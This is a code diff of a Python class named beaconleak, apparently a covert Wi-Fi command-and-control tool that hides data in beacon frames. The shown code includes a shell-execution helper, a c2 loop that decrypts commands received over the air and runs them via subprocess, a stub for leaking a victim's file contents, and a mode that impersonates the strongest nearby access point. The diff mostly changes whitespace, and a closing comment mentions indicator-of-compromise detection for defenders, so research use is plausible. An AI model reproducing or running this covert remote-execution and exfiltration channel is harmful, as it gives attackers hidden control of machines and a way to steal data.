@@ -79,6 +79,7 @@ class beaconleak():
         # TODO check beacon size and do covert element 221 stuffing
         self.marker = b'\x0b\x33'
 
+
     def cmd(self, cmd):
         if sys.platform == 'linux':
             args = shlex.split(cmd)
@@ -86,6 +87,7 @@ class beaconleak():
         else:
             result = subprocess.check_output(cmd, shell=True)
         return result
+
 
     def stuff_bytes(self, file):
         # called as victim, this will read a file, send its contents in the 
@@ -95,7 +97,6 @@ class beaconleak():
         with open(file, 'rb+') as f:
             pass
             
-
 
     def beacon_craft(self, msg):
         # general case
@@ -132,7 +133,8 @@ class beaconleak():
             # TODO check beacon size and do covert element 221 stuffing
             frame = self.covert_frame / _stuff
         return frame
-        
+
+
     def push_cmd(self, cmd, reply=True):
         # TODO: implement leak mode with extra measurements
         try:
@@ -157,6 +159,7 @@ class beaconleak():
         except Exception as e:
             if self.debug:
                 print("[d] error:\n{}".format(str(e)))
+
 
     def c2(self):
         # covert mode
@@ -245,7 +248,7 @@ class beaconleak():
         c = self.dec_payload(crypted)
         if c:
             try:
-                result = self.cmd(c.decode('utf-8'))
+                result = self.cmd(c)
             except Exception as e:
                 result = b"[e] Command failed"
                 if self.debug:
@@ -259,6 +262,7 @@ class beaconleak():
                 print("[d] response frame:\n{}".format(frame.command()))
             time.sleep(2)
             sendp(frame, iface=self.iface, verbose=int(self.debug))
+
 
     # TODO stuff element 221 for maximum lulz
     def magic(self, frame):
@@ -307,6 +311,7 @@ class beaconleak():
                 rssi = -100
             self.beacons[frame.addr2] = (rssi, frame)
 
+
     # this one is 1337
     def sneaky(self):
         print("[*] Covert mode enabled:")
@@ -340,6 +345,7 @@ class beaconleak():
         self.covert_frame = best_frame
         self.ssid = best_frame.info.decode('utf-8')
         self.bssid = best_frame.addr2
+
 
     # this is for the blue teamers
     # IoC detection from simple test to complex test
